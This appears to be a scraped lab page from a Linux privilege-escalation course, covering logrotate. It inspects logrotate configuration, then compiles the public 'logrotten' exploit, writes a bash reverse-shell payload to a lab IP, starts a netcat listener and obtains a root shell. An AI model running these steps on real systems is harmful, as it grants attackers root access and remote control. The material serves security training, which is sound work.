<!--
 // Platform: Academy
// URL: https://academy.hackthebox.com/module/51/section/1589
// Platform Version: V1
// Module ID: 51
// Module Name: Linux Privilege Escalation
// Module Difficulty: Easy
// Section ID: 1589
// Section Title: Logrotate
// Page Title: Linux Privilege Escalation
// Page Number: 18
-->

# Logrotate

**Module Name:** Linux Privilege Escalation **Page Number:** 18

#### LINUX PRIVILEGE ESCALATION

# Logrotate

``` shell-session
[!bash!]$ man logrotate
[!bash!]$ # or
[!bash!]$ logrotate --help

Usage: logrotate [OPTION...] <configfile>
  -d, --debug               Don't do anything, just test and print debug messages
  -f, --force               Force file rotation
  -m, --mail=command        Command to send mail (instead of '/usr/bin/mail')
  -s, --state=statefile     Path of state file
      --skip-state-lock     Do not lock the state file
  -v, --verbose             Display messages during rotation
  -l, --log=logfile         Log file or 'syslog' to log to syslog
      --version             Display version information

Help options:
  -?, --help                Show this help message
      --usage               Display brief usage message
```

``` shell-session
[!bash!]$ cat /etc/logrotate.conf


# see "man logrotate" for details

# global options do not affect preceding include directives

# rotate log files weekly
weekly

# use the adm group by default, since this is the owning group
# of /var/log/syslog.
su root adm

# keep 4 weeks worth of backlogs
rotate 4

# create new (empty) log files after rotating old ones
create

# use date as a suffix of the rotated file
#dateext

# uncomment this if you want your log files compressed
#compress

# packages drop log rotation information into this directory
include /etc/logrotate.d

# system-specific logs may also be configured here.
```

``` shell-session
[!bash!]$ sudo cat /var/lib/logrotate.status

/var/log/samba/log.smbd" 2022-8-3
/var/log/mysql/mysql.log" 2022-8-3
```

``` shell-session
[!bash!]$ ls /etc/logrotate.d/

alternatives  apport  apt  bootlog  btmp  dpkg  mon  rsyslog  ubuntu-advantage-tools  ufw  unattended-upgrades  wtmp
```

``` shell-session
[!bash!]$ cat /etc/logrotate.d/dpkg

/var/log/dpkg.log {
        monthly
        rotate 12
        compress
        delaycompress
        missingok
        notifempty
        create 644 root root
}
```

``` shell-session
logger@nix02:~$ git clone https://github.com/whotwagner/logrotten.git
logger@nix02:~$ cd logrotten
logger@nix02:~$ gcc logrotten.c -o logrotten
```

``` shell-session
logger@nix02:~$ echo 'bash -i >& /dev/tcp/10.10.14.2/9001 0>&1' > payload
```

``` shell-session
logger@nix02:~$ grep "create\|compress" /etc/logrotate.conf | grep -v "#"

create
```

``` shell-session
[!bash!]$ nc -nlvp 9001

Listening on 0.0.0.0 9001
```

``` shell-session
logger@nix02:~$ ./logrotten -p ./payload /tmp/tmp.log
```

``` shell-session
...
Listening on 0.0.0.0 9001

Connection received on 10.129.24.11 49818
# id

uid=0(root) gid=0(root) groups=0(root)
```

# 

# 

#### Questions

####